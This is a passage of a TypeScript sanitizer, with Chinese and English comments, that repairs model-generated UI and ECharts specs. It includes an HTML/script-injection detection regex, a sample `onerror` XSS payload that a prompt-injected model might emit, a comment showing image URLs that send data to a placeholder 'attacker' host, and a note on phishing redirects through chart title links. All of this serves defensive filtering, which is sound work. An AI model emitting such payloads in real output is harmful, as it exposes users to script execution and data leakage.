      // JSON.stringify 两遍(memo 比较器 + stateKey)= 主线程卡死([安全 §1.3])。
      // CC-GUI 不做插件自定义组件,透传是纯负债 —— 丢弃,并计入「已忽略」。
      return null
  }
}

/* ---------------- per-type sub-repairers ---------------- */

function repairStrings(v: unknown, cap: number, strCap: number): string[] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: string[] = []
  for (const item of v) {
    if (out.length >= cap) break
    if (typeof item === 'string') {
      out.push(item.slice(0, strCap))
    } else if (item !== null && typeof item === 'object') {
      // 兼容模型误用对象数组（如把 ask_user_question 的 {label,description}
      // 格式错用到 select/radio 的 options）——提取可读字段，而不是静默丢
      // 掉整个选项，让用户看到「选项没列举出来」的空列表。
      const o = item as Record<string, unknown>
      const s = typeof o.label === 'string' ? o.label
        : typeof o.value === 'string' ? o.value
        : typeof o.title === 'string' ? o.title
        : JSON.stringify(item)
      out.push(s.slice(0, strCap))
    }
  }
  return out
}

function repairListItems(
  v: unknown,
  cap: number,
  ctx: RepairCtx,
  depth: number,
): GenuiList['items'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiList['items'] = []
  for (const item of v) {
    if (out.length >= cap) break
    if (typeof item === 'string') {
      out.push(item.slice(0, GENUI_LIMITS.maxString))
      continue
    }
    const o = obj(item)
    const title = o === undefined ? undefined : str(o.title, GENUI_LIMITS.maxString)
    if (title !== undefined) {
      out.push({ title, ...opt('desc', o === undefined ? undefined : str(o.desc, GENUI_LIMITS.maxString)) })
      continue
    }
    if (o !== undefined && typeof o.type === 'string') {
      // Typed children are GenuiNodes: charge them against the shared node
      // budget (module header promise — exhausted budget elides remaining
      // siblings). Strings and {title,desc} objects are list-item shapes,
      // not nodes, so they never consume budget.
      if (ctx.remaining <= 0) break
      ctx.remaining -= 1
      const node = repairNode(o, ctx, depth)
      if (node !== null) out.push(node)
    }
  }
  return out
}

function repairRows(v: unknown, rowCap: number, colCap: number): Array<Array<string | number>> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<Array<string | number>> = []
  for (const row of v) {
    if (out.length >= rowCap) break
    if (!Array.isArray(row)) continue
    const cells: Array<string | number> = []
    for (const cell of row) {
      if (cells.length >= colCap) break
      if (typeof cell === 'string') cells.push(cell.slice(0, 256))
      else if (typeof cell === 'number' && Number.isFinite(cell)) cells.push(cell)
    }
    if (cells.length > 0) out.push(cells)
  }
  return out
}

function repairChartData(v: unknown, cap: number): Array<{ label: string; value: number; color?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; value: number; color?: string }> = []
  for (const datum of v) {
    if (out.length >= cap) break
    const o = obj(datum)
    const label = o === undefined ? undefined : str(o.label, 128)
    const value = o === undefined ? undefined : num(o.value, -1e12, 1e12)
    if (label === undefined || value === undefined) continue
    out.push({ label, value, ...opt('color', o === undefined ? undefined : color(o.color)) })
  }
  return out
}

function repairSeries(v: unknown, cap: number, pointCap: number): Array<{ label: string; color?: string; data: Array<{ label: string; value: number; color?: string }> }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; color?: string; data: Array<{ label: string; value: number; color?: string }> }> = []
  for (const s of v) {
    if (out.length >= cap) break
    const o = obj(s)
    const label = o === undefined ? undefined : str(o.label, 128)
    const data = o === undefined ? undefined : repairChartData(o.data, pointCap)
    if (label === undefined || data === undefined) continue
    out.push({ label, data, ...opt('color', o === undefined ? undefined : color(o.color)) })
  }
  return out
}

function repairTabs(v: unknown, ctx: RepairCtx, depth: number): Array<{ label: string; items: GenuiNode[] }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; items: GenuiNode[] }> = []
  for (const tab of v) {
    if (out.length >= GENUI_LIMITS.maxTabs) break
    const o = obj(tab)
    const label = o === undefined ? undefined : str(o.label, 128)
    if (label === undefined || o === undefined) continue
    // `content` is accepted as an `items` alias (single component or array) —
    // models routinely emit tabs[].content and losing it empties every tab.
    const rawItems = o.items !== undefined ? o.items
      : o.content !== undefined ? (Array.isArray(o.content) ? o.content : [o.content])
      : undefined
    out.push({ label, items: repairItems(rawItems, ctx, depth + 1) })
  }
  return out
}

/** Header text for an object-shaped table column ({title,key} antd style). */
function columnHeaderText(c: unknown): string {
  const o = obj(c)
  if (o === undefined) return String(c)
  for (const k of ['title', 'label', 'key', 'dataIndex'] as const) {
    const s = o[k]
    if (typeof s === 'string' && s !== '') return s
  }
  return JSON.stringify(c)
}

/** Row key for an object-shaped column, mirroring columnHeaderText's order. */
function columnKeyOf(c: unknown): string | undefined {
  const o = obj(c)
  if (o === undefined) return undefined
  for (const k of ['key', 'dataIndex', 'title', 'label'] as const) {
    const s = o[k]
    if (typeof s === 'string' && s !== '') return s
  }
  return undefined
}

/** Cell text for object-array rows: strings/finite numbers pass through,
 * everything else stringifies so the column alignment is preserved
 * (repairRows would drop null/undefined cells and shift the row). */
function cellText(v: unknown): string | number {
  if (typeof v === 'string') return v
  if (typeof v === 'number' && Number.isFinite(v)) return v
  if (v === null || v === undefined) return ''
  return JSON.stringify(v)
}

function repairPlotSeries(v: unknown, cap: number): GenuiPlot['series'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiPlot['series'] = []
  for (const s of v) {
    if (out.length >= cap) break
    const o = obj(s)
    const expr = o === undefined ? undefined : str(o.expr, 512)
    if (expr === undefined || o === undefined) continue
    // CGUI-PATCH(INTERFACE §2.8 末行):表达式非法 ⟹ **该条曲线不绘制**,其余曲线与整个
    // 组件照常。判定就是"能不能编译"(编译器本身不求值、不碰全局),放在守卫里而不是
    // 渲染层:守卫是唯一决定"树里有什么"的地方,留一条画不出来的曲线进去,图例、序列色
    // 分配、genui-series 计数就都多一格。截断到 512 之后再判 —— 截断本身可能截出半截。
    if (compileMathExpr(expr) === null) continue
    const params: NonNullable<GenuiPlotSeries['params']> = []
    if (Array.isArray(o.params)) {
      for (const p of o.params) {
        if (params.length >= GENUI_LIMITS.maxPlotParams) break
        const po = obj(p)
        // CGUI-PATCH(INTERFACE §2.3):`name` 必须是**单个小写字母** —— 它是表达式里的
        // 参数名,而 safe-math 只把 /^[a-z]$/ 当参数。名字对不上的参数拖出一根永远
        // 影响不到曲线的滑块,拖了没反应比没有更糟。
        const name = po === undefined ? undefined : str(po.name, 64)
        const value = po === undefined ? undefined : num(po.value, -1e9, 1e9)
        if (name === undefined || value === undefined || !/^[a-z]$/.test(name)) continue
        params.push({
          name, value,
          ...opt('min', po === undefined ? undefined : num(po.min, -1e9, 1e9)),
          ...opt('max', po === undefined ? undefined : num(po.max, -1e9, 1e9)),
          ...opt('step', po === undefined ? undefined : num(po.step, 1e-9, 1e9)),
          ...opt('animateTo', po === undefined ? undefined : num(po.animateTo, -1e9, 1e9)),
          ...opt('durationMs', po === undefined ? undefined : num(po.durationMs, 1, 120_000)),
          ...opt('loop', po === undefined ? undefined : po.loop === true ? true : undefined),
        })
      }
    }
    out.push({ expr, ...opt('label', str(o.label, 128)), ...opt('color', color(o.color)), ...opt('kind', enu(o.kind, PLOT_KINDS)), ...opt('params', params.length > 0 ? params : undefined) })
  }
  return out
}

function repairSteps(v: unknown): Array<{ title: string; desc?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ title: string; desc?: string }> = []
  for (const s of v) {
    if (out.length >= GENUI_LIMITS.maxSteps) break
    const o = obj(s)
    const title = o === undefined ? undefined : str(o.title, 256)
    if (title === undefined) continue
    out.push({ title, ...opt('desc', o === undefined ? undefined : str(o.desc, GENUI_LIMITS.maxString)) })
  }
  return out
}

function repairPairs(v: unknown, cap: number): Array<{ key: string; value: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ key: string; value: string }> = []
  for (const p of v) {
    if (out.length >= cap) break
    const o = obj(p)
    const key = o === undefined ? undefined : str(o.key, 256)
    const value = o === undefined ? undefined : str(o.value, GENUI_LIMITS.maxString)
    if (key === undefined || value === undefined) continue
    out.push({ key, value })
  }
  return out
}

function repairDiffs(v: unknown): Array<{ path: string; oldText: string | null; newText: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ path: string; oldText: string | null; newText: string }> = []
  for (const d of v) {
    if (out.length >= 24) break
    const o = obj(d)
    const path = o === undefined ? undefined : str(o.path, 1024)
    const newText = o === undefined ? undefined : str(o.newText, 20_000)
    if (path === undefined || newText === undefined) continue
    const old = o === undefined ? undefined : o.oldText
    out.push({ path, newText, oldText: old === null || typeof old !== 'string' ? null : old.slice(0, 20_000) })
  }
  return out
}

function repairAccordion(v: unknown, ctx: RepairCtx, depth: number): Array<{ title: string; items: GenuiNode[] }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ title: string; items: GenuiNode[] }> = []
  for (const item of v) {
    if (out.length >= GENUI_LIMITS.maxAccordionItems) break
    const o = obj(item)
    const title = o === undefined ? undefined : str(o.title, 256)
    if (title === undefined || o === undefined) continue
    out.push({ title, items: repairItems(o.items, ctx, depth + 1) })
  }
  return out
}

function repairMeshes(v: unknown): GenuiScene3D['meshes'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiScene3D['meshes'] = []
  for (const m of v) {
    if (out.length >= GENUI_LIMITS.maxMeshes) break
    const o = obj(m)
    const shape = o === undefined ? undefined : enu(o.shape, MESH_SHAPES)
    if (shape === undefined) continue
    const scale = o === undefined ? undefined : num(o.scale, -1e6, 1e6) ?? tuple3(o.scale)
    const size = o === undefined ? undefined : num(o.size, -1e6, 1e6) ?? tuple3(o.size)
    out.push({
      shape,
      ...opt('color', o === undefined ? undefined : color(o.color)),
      ...opt('position', o === undefined ? undefined : tuple3(o.position)),
      ...opt('rotation', o === undefined ? undefined : tuple3(o.rotation)),
      ...opt('scale', scale),
      ...opt('size', size),
    })
  }
  return out
}

function tuple3(v: unknown): [number, number, number] | undefined {
  if (!Array.isArray(v) || v.length !== 3) return undefined
  const [a, b, c] = v
  if (typeof a !== 'number' || !Number.isFinite(a) || typeof b !== 'number' || !Number.isFinite(b)
    || typeof c !== 'number' || !Number.isFinite(c)) return undefined
  return [Math.min(1e6, Math.max(-1e6, a)), Math.min(1e6, Math.max(-1e6, b)), Math.min(1e6, Math.max(-1e6, c))]
}

/* ---------------- diagram (editorial) sub-repairers ---------------- */

/** Clamp a coordinate/size to the 4px editorial grid. */
function grid4(v: number, min: number, max: number): number {
  return Math.min(max, Math.max(min, Math.round(v / 4) * 4))
}

function repairDiagramNodes(v: unknown): GenuiDiagram['nodes'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiDiagram['nodes'] = []
  const seen = new Set<string>()
  for (const raw of v) {
    if (out.length >= GENUI_LIMITS.maxDiagramNodes) break
    const o = obj(raw)
    if (o === undefined) continue
    const label = str(o.label, GENUI_LIMITS.maxString)
    if (label === undefined) continue
    // CGUI-PATCH(INTERFACE §2.5):`id` 不是必填 —— 那张表的必填只有 kind + nodes,
    // 节点侧只写 label/type。上游把 id 当必填,于是最自然的写法
    // `{"label":"API","type":"focal"}` 整批节点被静默丢光,图画出来是空的。
    // 缺省取 label:边的 from/to 本来就按人看得懂的名字写(`{"from":"API","to":"DB"}`),
    // 取 label 让这种写法直接连得上;真给了 id 就用 id。
    const id = str(o.id, 128) ?? label.slice(0, 128)
    if (seen.has(id)) continue
    seen.add(id)
    const nodeType = enu(o.type, DIAGRAM_NODE_TYPES)
    // Coordinate fields are clamped to a sane canvas and rounded to 4px.
    const x = o.x === undefined ? undefined : grid4(num(o.x, -1e6, 1e6) ?? 0, 0, 1e6)
    const y = o.y === undefined ? undefined : grid4(num(o.y, -1e6, 1e6) ?? 0, 0, 1e6)
    const w = o.w === undefined ? undefined : grid4(num(o.w, -1e6, 1e6) ?? 96, 40, 2000)
    const h = o.h === undefined ? undefined : grid4(num(o.h, -1e6, 1e6) ?? 48, 24, 1200)
    out.push({
      id, label,
      ...opt('sub', str(o.sub, 256)),
      ...opt('type', nodeType),
      ...opt('x', x),
      ...opt('y', y),
      ...opt('w', w),
      ...opt('h', h),
      ...opt('tag', str(o.tag, 32)),
    })
  }
  return out
}

function repairDiagramEdges(v: unknown): GenuiDiagram['edges'] | undefined {
  if (v === undefined) return []
  if (!Array.isArray(v)) return undefined
  const out: GenuiDiagram['edges'] = []
  for (const raw of v) {
    if (out.length >= GENUI_LIMITS.maxDiagramEdges) break
    const o = obj(raw)
    if (o === undefined) continue
    const from = str(o.from, 128)
    const to = str(o.to, 128)
    if (from === undefined || to === undefined) continue
    out.push({
      from, to,
      ...opt('label', str(o.label, GENUI_LIMITS.maxDiagramLabel)),
      ...opt('kind', enu(o.kind, DIAGRAM_EDGE_KINDS)),
      ...opt('route', enu(o.route, DIAGRAM_ROUTES)),
    })
  }
  return out
}

function repairDiagramTheme(v: unknown): GenuiDiagramTheme | undefined {
  const o = obj(v)
  if (o === undefined) return undefined
  const out: GenuiDiagramTheme = {}
  for (const key of ['paper', 'paper-2', 'ink', 'muted', 'soft', 'rule', 'accent', 'accent-tint', 'link'] as const) {
    const c = color(o[key])
    if (c !== undefined) out[key] = c
  }
  return Object.keys(out).length === 0 ? undefined : out
}

function repairDiagramZones(v: unknown): GenuiDiagram['zones'] | undefined {
  if (v === undefined) return []
  if (!Array.isArray(v)) return undefined
  const out: GenuiDiagram['zones'] = []
  for (const raw of v) {
    if (out.length >= GENUI_LIMITS.maxDiagramZones) break
    const o = obj(raw)
    if (o === undefined) continue
    const label = str(o.label, 64)
    if (label === undefined) continue
    out.push({
      label,
      ...opt('x', o.x === undefined ? undefined : grid4(num(o.x, -1e6, 1e6) ?? 0, 0, 1e6)),
      ...opt('y', o.y === undefined ? undefined : grid4(num(o.y, -1e6, 1e6) ?? 0, 0, 1e6)),
      ...opt('w', o.w === undefined ? undefined : grid4(num(o.w, -1e6, 1e6) ?? 100, 40, 2000)),
      ...opt('h', o.h === undefined ? undefined : grid4(num(o.h, -1e6, 1e6) ?? 100, 40, 1200)),
    })
  }
  return out
}

function repairDiagram(v: unknown): GenuiDiagram | null {
  const o = obj(v)
  if (o === undefined) return null
  const kind = enu(o.kind, DIAGRAM_KINDS as unknown as readonly GenuiDiagramKind[])
  if (kind === undefined) return null
  const nodes = repairDiagramNodes(o.nodes)
  if (nodes === undefined) return null
  const edges = repairDiagramEdges(o.edges)
  if (edges === undefined) return null
  const zones = repairDiagramZones(o.zones)
  if (zones === undefined) return null
  return {
    type: 'diagram', kind, nodes, edges, zones,
    ...opt('variant', enu(o.variant, DIAGRAM_VARIANTS)),
    ...opt('title', str(o.title, 256)),
    ...opt('theme', repairDiagramTheme(o.theme)),
  }
}

function repairTimeline(v: unknown, cap: number): Array<{ title: string; desc?: string; time?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ title: string; desc?: string; time?: string }> = []
  for (const item of v) {
    if (out.length >= cap) break
    const o = obj(item)
    const title = o === undefined ? undefined : str(o.title, 256)
    if (title === undefined) continue
    out.push({
      title,
      ...opt('desc', o === undefined ? undefined : str(o.desc, GENUI_LIMITS.maxString)),
      ...opt('time', o === undefined ? undefined : str(o.time, 128)),
    })
  }
  return out
}

function repairTree(v: unknown, cap: number): GenuiFileTreeNode[] | undefined {
  // Recursion is bounded by GENUI_LIMITS.maxTreeDepth (see the inner walk).
  return walkTree(v, cap, GENUI_LIMITS.maxTreeDepth)
}

function walkTree(v: unknown, cap: number, depthLeft: number): GenuiFileTreeNode[] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiFileTreeNode[] = []
  for (const item of v) {
    if (out.length >= cap) break
    const o = obj(item)
    const name = o === undefined ? undefined : str(o.name, 256)
    if (name === undefined) continue
    const children = o !== undefined && depthLeft > 0 && Array.isArray(o.children) ? walkTree(o.children, cap, depthLeft - 1) : undefined
    out.push({ name, ...opt('type', o === undefined ? undefined : enu(o.type, FILE_TYPES)), ...opt('children', children) })
  }
  return out
}

function repairQuizOptions(v: unknown): Array<{ label: string; correct?: boolean; feedback?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; correct?: boolean; feedback?: string }> = []
  for (const optItem of v) {
    if (out.length >= GENUI_LIMITS.maxQuizOptions) break
    const o = obj(optItem)
    const label = o === undefined ? undefined : str(o.label, 512)
    if (label === undefined) continue
    out.push({
      label,
      ...opt('correct', o === undefined ? undefined : o.correct === true ? true : undefined),
      ...opt('feedback', o === undefined ? undefined : str(o.feedback, GENUI_LIMITS.maxString)),
    })
  }
  return out
}

/**
 * Patterns that indicate HTML/script injection in a string field. ECharts
 * default `tooltip.renderMode: 'html'` writes tooltip content via
 * `innerHTML`; even with renderMode forced to 'richText' (see below),
 * filtering these patterns is defense-in-depth — a model (or a
 * prompt-injected model) should never emit `<script>`, `onerror=`, or
 * `javascript:` inside a chart option string.
 */
const ECHART_HTML_DANGER_RE = /<(?:script|img|svg|iframe|video|audio|object|embed|source)\b|on[a-z]+\s*=|javascript:/i

/**
 * Mutable budget counter for the sanitize walk — passed by reference so
 * every recursion shares one pool.
 */
interface EChartSanitizeBudget {
  count: number
  /**
   * CGUI-PATCH(INTERFACE §5.5):三条预算(深度 >10 / 任一数组 >500 / 总条目 >2000)
   * 任意一条越界 ⟹ **option 整体作废**,不是"切到上限继续用"。切片保留等于告诉写规格
   * 的人"500 条以内随便进",安全边界要从严:越界的 option 本身就不可信,回退 preset。
   */
  voided: boolean
}

/**
 * Sanitize an ECharts option object: depth-bounded, budget-bounded
 * pass-through that strips dangerous values (functions, `url()` in styles,
 * HTML/script injection patterns in strings) but preserves the object shape
 * ECharts needs. Scalars are KEPT: ECharts options are full of them,
 * including inside `data` arrays (`data: [120, 150, 180]`,
 * `xAxis.data: ['1月', '2月']`). Previously a scalar hit the plain-object
 * gate below and returned undefined, so every primitive-valued array was
 * filtered to empty and dropped — a chart with a full `option` rendered
 * with empty series (blank canvas). This is a safety walk, not an ECharts
 * semantic validator.
 *
 * Security: `tooltip.renderMode` is forced to `'richText'` on every tooltip
 * object. ECharts' default `'html'` mode writes tooltip content via
 * `innerHTML`, which is an XSS vector when the option originates from model
 * output — a prompt-injected model could emit
 * `{"tooltip":{"formatter":"<img src=x onerror=...>"}}` and execute
 * arbitrary script. `richText` renders as text, never touching innerHTML.
 */
function sanitizeEChartOption(v: unknown, depth: number, budget: EChartSanitizeBudget): unknown {
  // CGUI-PATCH: 越界即作废(见 EChartSanitizeBudget.voided)。作废后立刻停走 ——
  // 结果反正要丢,继续遍历只是白烧主线程(超预算的 option 正是大到会卡页面的那种)。
  if (budget.voided) return undefined
  if (budget.count <= 0) { budget.voided = true; return undefined }
  budget.count -= 1
  if (depth > GENUI_LIMITS.maxEChartOptionDepth) { budget.voided = true; return undefined }
  // Scalars pass through: numbers/strings/booleans/null are legal ECharts
  // values both as object fields and as array elements.
  if (typeof v === 'string') {
    const s = v.slice(0, GENUI_LIMITS.maxString)
    // CGUI-PATCH(缺口 C):外部资源引用整条丢弃。图表不需要远程图片,而
    // `symbol:"image://http://attacker/x?d=…"` / `graphic` 的 `style.image` /
    // `backgroundColor:{image:"https://…"}` 都不含 `url(`、不命中危险正则,上游一条
    // 都拦不住([安全 §3.3])—— 用户看个图表就把 IP 和 URL 里编码的内容送了出去。
    // 判定前先剔控制符,免得 `image:<TAB>//…` 之类的变形绕过。
    if (isExternalRef(stripControl(s))) return undefined
    // Reject strings containing HTML/script injection patterns or CSS url()
    // (exfiltration channel). Preserves legitimate ECharts string values
    // (labels, plain-text formatter templates, etc.).
    if (s.toLowerCase().includes('url(') || ECHART_HTML_DANGER_RE.test(s)) return undefined
    return s
  }
  if (typeof v === 'number' && Number.isFinite(v)) return v
  if (typeof v === 'boolean') return v
  if (v === null) return null
  if (Array.isArray(v)) {
    // CGUI-PATCH: 超长数组不再切片保留,整份 option 作废(INTERFACE §5.5)。
    if (v.length > GENUI_LIMITS.maxEChartArrayLen) { budget.voided = true; return undefined }
    const cap = v.length
    const arr: unknown[] = []
    for (let i = 0; i < cap; i++) {
      const s = sanitizeEChartOption(v[i], depth + 1, budget)
      if (s !== undefined) arr.push(s)
    }
    // CGUI-PATCH(上游缺陷):原本就空的数组保留 —— `data: []` 是合法 ECharts 写法;
    // 只有"有元素但全被过滤"才丢弃,不给被拦内容留空壳。对象分支同款,见函数尾。
    return arr.length > 0 || v.length === 0 ? arr : undefined
  }
  const o = obj(v)
  if (o === undefined) return undefined
  const out: Record<string, unknown> = {}
  for (const [key, val] of Object.entries(o)) {
    const s = sanitizeEChartOption(val, depth + 1, budget)
    if (s === undefined) continue
    // Force tooltip.renderMode: 'richText' to prevent ECharts from writing
    // tooltip content via innerHTML (the default 'html' mode is an XSS
    // vector when the option comes from model output).
    if (key === 'tooltip' && typeof s === 'object' && s !== null && !Array.isArray(s)) {
      (s as Record<string, unknown>).renderMode = 'richText'
    }
    // CGUI-PATCH(缺口 C):`title.link` / `title.sublink` 整键删除。ECharts 点标题就
    // `window.open(link)`,是钓鱼跳转通道([安全 §3.3 判为"半拦":`javascript:` 命中
    // 危险正则被丢,`http://attacker/…` 原样保留)。按**键名**删而不看值 —— 同源相对
    // 路径一样删,因为"图表标题可点跳转"这个能力本身就不该存在(INTERFACE §5.5)。
    // 按 title 这一层删而不是全树删 `link`:ECharts 别处也有叫 link 的合法字段。
    // 多标题(title 是数组)与 baseOption / media 里的 title 都走同一条(递归到那一层
    // 时 key 同样是 'title')。
    if (key === 'title' && typeof s === 'object' && s !== null) {
      for (const one of Array.isArray(s) ? s : [s]) {
        if (typeof one === 'object' && one !== null && !Array.isArray(one)) {
          delete (one as Record<string, unknown>).link
          delete (one as Record<string, unknown>).sublink
        }
      }
    }
    out[key] = s
  }
  // CGUI-PATCH(上游缺陷):原本就空的对象保留 —— `yAxis:{}` / `grid:{}` 是"用默认
  // 配置"的合法常见写法,丢掉后 ECharts 抛 `yAxis "0" not found`、整图渲染失败;
  // 只有"有键但全被过滤"(如 {tooltip:{formatter:'<script>…'}})才照旧整个丢弃。
  return Object.keys(out).length > 0 || Object.keys(o).length === 0 ? out : undefined
}

/**
 * Deterministically repair a raw spec value into a renderable GenuiSpec.
 * Returns null only when the root is not an object with an `items` array
 * (a bare component root is wrapped into a col first — the documented fence
 * vocabulary allows single-component bodies); every other defect is healed by
 * dropping/clamping/truncating. Idempotent: repairing a repaired spec is a
 * no-op.
 */
export function repairGenuiSpec(value: unknown): GenuiSpec | null {
  const v = obj(value)
  if (v === undefined) return null
  if (!Array.isArray(v.items)) {
    const wrapped = wrapSingleComponentRoot(value)
    if (wrapped === null) return null
    return repairGenuiSpec(wrapped)
  }
  const ctx: RepairCtx = { remaining: GENUI_LIMITS.maxNodes, dropped: 0, kept: 0, scene3d: 0 }
  // 先走完再读计数:对象字面量里读 ctx 依赖属性求值顺序,是"改一行就静默错"的写法。
  const items = repairItems(v.items, ctx, 0)
  return {
    ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
    ...opt('gap', num(v.gap, 0, 96)),
    ...opt('panel', v.panel === true ? true : undefined),
    ...opt('append', v.append === true ? true : undefined),
    items,
    // CGUI-PATCH:两个计数随 spec 一起回传 —— 它们是"渲染成什么样"的输入
    // (kept=0 ⟹ 退回代码块;dropped>0 ⟹ 底部灰字),不是诊断附加物。
    // 注意:因此 `repairGenuiSpec(repairGenuiSpec(x))` 的 dropped 会归零(第二遍没东西
    // 可丢)—— 幂等性对 items 仍成立,对计数按定义不成立,别拿修好的 spec 再修一遍。
    dropped: ctx.dropped,
    kept: ctx.kept,
  }
}

/* ---------------- validation ---------------- */

/**
 * Count the nodes of a spec tree (every item, descending into tabs /
 * accordion / file-tree / list containers — the same descent
 * `validateGenuiSpec` walks). Shared by the panel fold (node-budget gate)
 * and validation, so the panel never runs a second, divergent traversal.
 * `cap` bounds the walk for hostile inputs; the panel passes
 * `PANEL_LIMITS.maxNodes + 1` to detect overflow without counting the whole
 * tree.
 */
export function countGenuiNodes(value: unknown, cap = Number.POSITIVE_INFINITY): number {
  let count = 0
  const walk = (list: unknown): void => {
    if (!Array.isArray(list)) return
    for (const item of list) {
      if (count >= cap) return
      count += 1
      const v = obj(item)
      if (v === undefined) continue
      if (v.type === 'tabs' && Array.isArray(v.tabs)) {
        for (const t of v.tabs) {
          if (count >= cap) return
          const to = obj(t)
          if (to !== undefined) walk(to.items)
        }
      } else if (v.type === 'accordion' && Array.isArray(v.items)) {
        for (const it of v.items) {
          if (count >= cap) return
          const io = obj(it)
          if (io !== undefined) walk(io.items)
        }
      } else if ((v.type === 'row' || v.type === 'col' || v.type === 'grid' || v.type === 'card') && Array.isArray(v.items)) {
        // Layout containers hold real children; skipping them undercounted
        // the tree and hid silent drops from validate_dsh_ui (issue #42).
        walk(v.items)
      } else if (v.type === 'file-tree' && Array.isArray(v.items)) {
        walk(v.items)
      } else if (v.type === 'list' && Array.isArray(v.items)) {
        // Typed list children are nodes too (repair charges them against the
        // budget); strings and {title,desc} shapes are skipped.
        for (const li of v.items) {
          if (count >= cap) return
          const lo = obj(li)
          if (lo !== undefined && typeof lo.type === 'string') walk([lo])
        }
      }
    }
  }
  const root = obj(value)
  walk(root === undefined ? [] : root.items)
  return count
}

/** Every white-listed node `type`. Keep in sync with the repairNode switch —
 * validate_dsh_ui uses it to tell declared GenUI nodes apart from unrelated
 * `"type"` strings (e.g. file-tree's `{type:'file'}` children). */
export const GENUI_NODE_TYPES: ReadonlySet<string> = new Set([
  'accordion', 'audio', 'avatar', 'badge', 'breadcrumb', 'button', 'callout', 'card', 'chart',
  'checkbox', 'code', 'col', 'copy', 'diff', 'divider', 'file-tree', 'grid', 'input', 'json',
  'keyvalue', 'link', 'list', 'mermaid', 'plot', 'progress', 'quiz', 'radio', 'row', 'scene3d',
  'select', 'slider', 'spacer', 'stat', 'steps', 'submit', 'switch', 'table', 'tabs', 'text',
  'textarea', 'timeline', 'video', 'echart', 'diagram',
])

/**
 * Count DECLARED nodes in a raw spec tree: objects whose `type` is a
 * white-listed string, descending the same containers `countGenuiNodes`
 * walks. `validate_dsh_ui` compares this with the repaired count to surface
 * children the repair silently dropped (blank-render class of bugs, issue
 * #42) instead of reporting a green check on a half-empty tree.
 */
export function countDeclaredGenuiNodes(value: unknown, cap = Number.POSITIVE_INFINITY): number {
  let count = 0
  const declared = (candidate: unknown): boolean => {
    const o = obj(candidate)
    return o !== undefined && typeof o.type === 'string' && GENUI_NODE_TYPES.has(o.type)
  }
  const walk = (list: unknown): void => {
    if (!Array.isArray(list)) return
    for (const item of list) {
      if (count >= cap) return
      if (!declared(item)) continue
      count += 1
      const v = obj(item)
      if (v === undefined) continue
      if (v.type === 'tabs' && Array.isArray(v.tabs)) {
        for (const t of v.tabs) walkItemsOf(t)
      } else if (v.type === 'accordion' && Array.isArray(v.items)) {
        for (const it of v.items) walkItemsOf(it)
      } else if ((v.type === 'row' || v.type === 'col' || v.type === 'grid' || v.type === 'card') && Array.isArray(v.items)) {
        walk(v.items)
      } else if (v.type === 'list' && Array.isArray(v.items)) {
        for (const li of v.items) {
          if (declared(li)) walk([li])
        }
      }
    }
  }
  const walkItemsOf = (holder: unknown): void => {
    const o = obj(holder)
    if (o === undefined) return
    const items = o.items !== undefined ? o.items : o.content
    if (Array.isArray(items)) walk(items)
    else if (declared(items)) walk([items])
  }
  const root = obj(value)
  if (root === undefined) return count
  // Single-component root (no items array): the root itself is the declared node.
  if (!Array.isArray(root.items) && declared(value)) walk([value])
  else walk(root.items)
  return count
}

/**
 * Validate a raw spec value against the white list and limits, collecting
 * human-readable problems. Unlike repair this never mutates: it is a
 * diagnostic for tests and tooling. Unknown `type`s are reported (a plugin
 * custom type is valid only when a renderer is registered — the guard cannot
 * know, so it flags them as warnings).
 */
export function validateGenuiSpec(value: unknown): GenuiValidation {
  const errors: string[] = []
  const v = obj(value)
  if (v === undefined) return { ok: false, errors: ['spec root must be an object'] }
  if (!Array.isArray(v.items)) {
    // Single-component root: validate through the wrapped form so the tool
    // agrees with the renderer about what is a valid fence body.
    const wrapped = wrapSingleComponentRoot(value)
    if (wrapped !== null) return validateGenuiSpec(wrapped)
    return { ok: false, errors: ['spec.items must be an array'] }
  }
  if (v.title !== undefined && typeof v.title !== 'string') errors.push('spec.title must be a string')
  if (v.gap !== undefined && (typeof v.gap !== 'number' || !Number.isFinite(v.gap))) errors.push('spec.gap must be a finite number')
  let count = 0
  let capped = false
  const walk = (list: unknown, depth: number, path: string): void => {
    if (capped) return
    if (!Array.isArray(list)) {
      errors.push(`${path} must be an array`)
      return
    }
    for (let i = 0; i < list.length; i++) {
      if (capped || count >= GENUI_LIMITS.maxNodes) {
        if (!capped) {
          errors.push(`spec exceeds ${GENUI_LIMITS.maxNodes} nodes; tail elided`)
          capped = true
        }
        return
      }
      count += 1
      const at = `${path}[${i}]`
      validateNode(list[i], depth, at, errors, walk)
    }
  }
  walk(v.items, 0, 'items')
  return { ok: errors.length === 0, errors }
}

type Walker = (list: unknown, depth: number, path: string) => void

function validateNode(value: unknown, depth: number, at: string, errors: string[], walk: Walker): void {
  if (depth > GENUI_LIMITS.maxDepth) {
    errors.push(`${at}: exceeds max depth ${GENUI_LIMITS.maxDepth}`)
    return
  }
  const v = obj(value)
  if (v === undefined) {
    errors.push(`${at}: must be an object`)
    return
  }
  const type = v.type
  if (typeof type !== 'string') {
    errors.push(`${at}: missing string 'type'`)
    return
  }
  const isStr = (name: string): void => { if (v[name] !== undefined && typeof v[name] !== 'string') errors.push(`${at}: '${name}' must be a string`) }
  const isNum = (name: string): void => { if (v[name] !== undefined && (typeof v[name] !== 'number' || !Number.isFinite(v[name]))) errors.push(`${at}: '${name}' must be a finite number`) }
  switch (type) {
    case 'text':
      if (typeof v.content !== 'string' && typeof v.text !== 'string') {
        errors.push(`${at}: type 'text' requires content or text (string)`)
      }
